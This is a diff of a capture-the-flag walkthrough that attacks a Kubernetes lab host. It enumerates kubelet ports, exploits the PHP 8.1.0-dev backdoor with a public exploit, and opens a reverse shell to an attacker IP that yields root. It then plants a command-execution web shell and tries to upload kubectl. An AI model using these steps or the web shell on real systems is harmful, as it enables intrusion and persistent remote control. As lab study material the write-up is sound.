@@ -289,6 +289,73 @@ PORT      STATE SERVICE     VERSION
 <br>
 <h1 align="center">Directory and File Enumeration</h1>
 
+
+```bash
+:~/FrankandHerbyTryAgain# which feroxbuster
+```
+
+```bash
+:~/FrankandHerbyTryAgain# cargo install feroxbuster
+```
+
+```bash
+:~/FrankandHerbyTryAgain# cat /root/FrankandHerbyTryAgain/raft-medium-words-lowercase.txt | head
+```
+
+```bash
+:~/FrankandHerbyTryAgain# feroxbuster -u http://10.201.80.52:10255 -w raft-medium-words-lowercase.txt
+```
+
+
+<h2 align="center">10250</h2>
+
+
+<h2 align="center">10255</h2>
+
+```bash
+:~/FrankandHerbyTryAgain# gobuster dir -u http://10.201.80.52:10255 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt -b 400 --exclude-length 48,19
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.201.80.52:10255
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt
+[+] Negative Status codes:   404
+[+] Exclude Length:          48,19
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              html,txt,js,json,php
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/stats                (Status: 301) [Size: 42] [--> /stats/]
+/logs                 (Status: 301) [Size: 41] [--> /logs/]
+/.                    (Status: 301) [Size: 36] [--> /]
+/exec                 (Status: 301) [Size: 41] [--> /exec/]
+/attach               (Status: 301) [Size: 43] [--> /attach/]
+/run                  (Status: 301) [Size: 40] [--> /run/]
+/metrics              (Status: 200) [Size: 2959434]
+/pods                 (Status: 200) [Size: 32105]
+Progress: 337758 / 337764 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+
+<h2 align="center">10257</h2>
+
+
+<h2 align="center">10259</h2>
+
+<h2 align="center">16443</h2>
+
+<h2 align="center">25000</h2>
+
+<h2 align="center">30679</h2>
+
+
 ```bash
 :~/FrankandHerbyTryAgain# dirsearch -u https://10.201.80.52:10250/
 
@@ -347,6 +414,17 @@ Task Completed
 <br>
 <br>
 <h1 align="center">Web Interface Inspection</h1>
+
+<h2 align="center">10250</h2>
+
+<img width="1226" height="187" alt="image" src="https://github.com/user-attachments/assets/8798172c-aa7f-48de-9b29-8e0e0271742c" />
+
+
+<h2 align="center">10255</h2>
+
+<img width="1235" height="304" alt="image" src="https://github.com/user-attachments/assets/c19a830d-5956-4ac6-b215-e24d51d732d9" />
+
+
 <h2 align="center">25000</h2>
 
 
@@ -388,10 +466,39 @@ There is no way they will break in this time!
 ```
 
 <h1 align="center">Weaponization</h1>
+
+
+```bash
+:~/FrankandHerbyTryAgain# searchsploit PHP 8.1.0
+```
+
+```bash
+:~/FrankandHerbyTryAgain# searchsploit -m 49933.py
+```
+
+```bash
+~/FrankandHerbyTryAgain# python3 49933.py
+Enter the full host url:
+http://10.201.80.52:30679/
+```
+
+```bash
+$ id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+<img width="1291" height="534" alt="image" src="https://github.com/user-attachments/assets/b2822499-c188-4a13-b86b-68d763d05c14" />
+
+
 <p align="center">Downloaded  a repository</p>
 
 ```bash
 :~# git clone https://github.com/flast101/php-8.1.0-dev-backdoor-rce
+```
+
+```bash
+:~/FrankandHerbyTryAgain/php-8.1.0-dev-backdoor-rce# ls
+backdoor_php_8.1.0-dev.py  docs  README.md  revshell_php_8.1.0-dev.py
 ```
 
 <p align="center">Reverse Shell Listener Setup</p>
@@ -413,7 +520,7 @@ python3 revshell_php_8.1.0-dev.py http://<Target_IP>:<Target_Port> <Attack_IP> <
 <p align="center">Exploit execution</p>
 
 ```bash
-:~# python3 revshell_php_8.1.0-dev.py http://10.201.49.183:30679 10.201.39.157 9001
+:~/FrankandHerbyTryAgain/php-8.1.0-dev-backdoor-rce# python3 revshell_php_8.1.0-dev.py http://10.201.80.52:30679 10.201.20.61 9001
 ```
 
 <br>
@@ -421,13 +528,41 @@ python3 revshell_php_8.1.0-dev.py http://<Target_IP>:<Target_Port> <Attack_IP> <
 <h1 align="center">Initial Foothold</h1>
 
 ```bash
-:~# nc -nlvp 9001
-...
-root@php-deploy-6d998f68b9-c2fdc:/var/www/html# id
-id
-uid=0(root) gid=0(root) groups=0(root)
-root@php-deploy-6d998f68b9-c2fdc:/var/www/html# 
+:~/FrankandHerbyTryAgain# nc -nlvp 9001
+Listening on 0.0.0.0 9001
+Connection received on 10.201.80.52 58192
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@php-deploy-6d998f68b9-qvxwp:/var/www/html# 
 ```
+
+```bash
+root@php-deploy-6d998f68b9-qvxwp:/var/www/html# ls -lah
+ls -lah
+total 16K
+drwxrwxr-x 2 1000 1000 4.0K Mar 21  2022 .
+drwxr-xr-x 3 root root 4.0K Mar 30  2021 ..
+-rw-rw-r-- 1 1000 1000  640 Mar 21  2022 index.php
+-rw-rw-r-- 1 1000 1000   20 Mar 21  2022 info.php
+```
+
+```bash
+root@php-deploy-6d998f68b9-qvxwp:/var/www/html# ip a
+ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+3: eth0@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1440 qdisc noqueue state UP group default 
+    link/ether 5e:41:78:70:d4:f8 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet 10.1.215.65/32 brd 10.1.215.65 scope global eth0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::5c41:78ff:fe70:d4f8/64 scope link 
+       valid_lft forever preferred_lft forever
+```
+
 
 ```bash
 root@php-deploy-6d998f68b9-c2fdc:/var/www/html# find / type -name *.io 2>/dev/null
@@ -506,8 +641,161 @@ root@php-deploy-6d998f68b9-c2fdc:/var/www/html#  exit
 
 
 ```bash
-/tmp# curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
+:~/FrankandHerbyTryAgain# curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   138  100   138    0     0   2760      0 --:--:-- --:--:-- --:--:--  2760
+100 57.7M  100 57.7M    0     0   156M      0 --:--:-- --:--:-- --:--:--  156M
 ```
+
+```bash
+<?php;$target_dir = "uploads/";$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);$uploadOk = 1;$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));if(isset($_POST["submit"])) {  $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);  if($check !== false) {    echo "File is an image - " . $check["mime"] . ".";    $uploadOk = 1;  } else {    echo "File is not an image.";    $uploadOk = 0;  }}?>
+```
+
+```bash
+echo '<?php;$target_dir = "uploads/";$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);$uploadOk = 1;$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));if(isset($_POST["submit"])) {  $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);  if($check !== false) {    echo "File is an image - " . $check["mime"] . ".";    $uploadOk = 1;  } else {    echo "File is not an image.";    $uploadOk = 0;  }}?>'
+```
+
+
+root@php-deploy-6d998f68b9-qvxwp:/var/www/html# cat > /var/www/html/n.php << 'EOF'
+<p:/var/www/html# cat > /var/www/html/n.php << 'EOF'
+> <?php
+<?php
+> if(isset($_GET['cmd'])){
+if(isset($_GET['cmd'])){
+>   system($_GET['cmd']);
+  system($_GET['cmd']);
+> }
+}
+> ?>
+?>
+> EOF
+EOF
+root@php-deploy-6d998f68b9-qvxwp:/var/www/html# 
+
+
+
+
+root@php-deploy-6d998f68b9-qvxwp:/var/www/html# ls
+ls
+index.php
+info.php
+n.php
+
+
+
+root@php-deploy-6d998f68b9-qvxwp:/var/www/html# cat n.php
+cat n.php
+<?php
+if(isset($_GET['cmd'])){
+  system($_GET['cmd']);
+}
+?>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+root@php-deploy-6d998f68b9-qvxwp:/var/www/html# cat a.php << 'EOF'
+cat a.php << 'EOF'
+> <?php
+<?php
+> $target_dir = "uploads/";
+$target_dir = "uploads/";
+> $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
+$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
+> $uploadOk = 1;
+$uploadOk = 1;
+> $imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));
+$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));
+> if(isset($_POST["submit"])) {
+if(isset($_POST["submit"])) {
+>   $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
+  $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
+>   if($check !== false) {
+  if($check !== false) {
+>     echo "File is an image - " . $check["mime"] . ".";
+    echo "File is an image - " . $check["mime"] . ".";
+>     $uploadOk = 1;
+    $uploadOk = 1;
+>   } else {
+  } else {
+>     echo "File is not an image.";
+    echo "File is not an image.";
+>     $uploadOk = 0;
+    $uploadOk = 0;
+>   }
+  }
+> }
+}
+> ?>
+?>
+> EOF
+EOF
+cat: a.php: No such file or directory
+root@php-deploy-6d998f68b9-qvxwp:/var/www/html# 
+
+
+
+:~/FrankandHerbyTryAgain# curl -F "fileToUpload=@/root/FrankandHerbyTryAgain/kubectl" -F "submit=Upload" http://10.201.80.52:30679/y.php
+
+
+
+
+
+
+
+
+```bash
+root@php-deploy-6d998f68b9-qvxwp:/var/www/html# echo '<?php;$target_dir = "uploads/";$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);$uploadOk = 1;$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));if(isset($_POST["submit"])) {  $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);  if($check !== false) {    echo "File is an image - " . $check["mime"] . ".";    $uploadOk = 1;  } else {    echo "File is not an image.";    $uploadOk = 0;  }}?>' >> rose.php
+<ot an image.";    $uploadOk = 0;  }}?>' >> rose.php
+root@php-deploy-6d998f68b9-qvxwp:/var/www/html# ls
+ls
+index.php
+info.php
+rose.php
+root@php-deploy-6d998f68b9-qvxwp:/var/www/html#
+```
+
+```bash
+:~/FrankandHerbyTryAgain# curl -v http://10.201.80.52:30679/rose.php
+*   Trying 10.201.80.52:30679...
+* TCP_NODELAY set
+* Connected to 10.201.80.52 (10.201.80.52) port 30679 (#0)
+> GET /rose.php HTTP/1.1
+> Host: 10.201.80.52:30679
+> User-Agent: curl/7.68.0
+> Accept: */*
+> 
+```
+
+```bash
+root@php-deploy-6d998f68b9-qvxwp:/var/www/html# ls
+ls
+index.php
+info.php
+rose.php
+```
+
+```bash
+root@php-deploy-6d998f68b9-qvxwp:/var/www/html# exit
+```
+
+
+<img width="1230" height="190" alt="image" src="https://github.com/user-attachments/assets/3e64db4b-29af-490b-baa8-a19797878a49" />
+
+
+
 
 ```bash
 /tmp# curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl.sha256"
